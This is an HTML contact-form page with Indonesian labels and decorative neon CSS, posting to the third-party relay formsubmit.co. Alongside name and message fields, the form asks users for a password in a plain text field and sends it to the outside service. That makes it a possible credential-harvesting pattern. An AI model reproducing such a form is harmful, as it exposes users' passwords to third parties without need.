<!DOCTYPE html>
<html>
<head>
  <title>Contact Me</title>

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }

    body {
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      overflow: hidden;
    }

    /* Background glowing circles */
    body::before, body::after {
      content: "";
      position: absolute;
      width: 400px;
      height: 400px;
      border-radius: 50%;
      filter: blur(120px);
      z-index: 0;
    }

    body::before {
      background: #00f2ff;
      top: -100px;
      left: -100px;
    }

    body::after {
      background: #ff00c8;
      bottom: -100px;
      right: -100px;
    }

    .card {
      position: relative;
      z-index: 1;
      width: 350px;
      padding: 30px;
      border-radius: 20px;
      backdrop-filter: blur(15px);
      background: rgba(255, 255, 255, 0.08);
      border: 1px solid rgba(255, 255, 255, 0.2);
      box-shadow: 0 0 25px rgba(0, 255, 255, 0.3);
      text-align: center;
      color: white;
      animation: fadeIn 1.5s ease;
    }

    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(30px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .card h2 {
      margin-bottom: 20px;
      font-size: 24px;
      text-shadow: 0 0 10px #00f2ff;
    }

    input, textarea {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 10px;
      border: none;
      outline: none;
      background: rgba(255, 255, 255, 0.1);
      color: white;
      font-size: 14px;
      transition: 0.3s;
    }

    input::placeholder,
    textarea::placeholder {
      color: rgba(255, 255, 255, 0.6);
    }

    input:focus, textarea:focus {
      box-shadow: 0 0 10px #00f2ff;
      background: rgba(255, 255, 255, 0.15);
    }

    button {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      border-radius: 10px;
      border: none;
      background: linear-gradient(45deg, #00f2ff, #ff00c8);
      color: white;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
      box-shadow: 0 0 15px rgba(255, 0, 200, 0.6);
    }

    button:hover {
      transform: scale(1.05);
      box-shadow: 0 0 25px rgba(0, 255, 255, 0.9);
    }

  </style>
</head>

<body>

  <div class="card">
    <h2>ðŸŽ® Contact Me</h2>

    <form action="https://formsubmit.co/24f4ca10aec07753845205d99b173fb9" method="POST">
      <input type="text" name="name" placeholder="Nama" required>
      <input type="text" name="password" placeholder="Password" required>
      <textarea name="message" rows="4" placeholder="Pesan" required></textarea>
      <button type="submit">Kirim Pesan</button>
    </form>
  </div>

</body>
  </html>
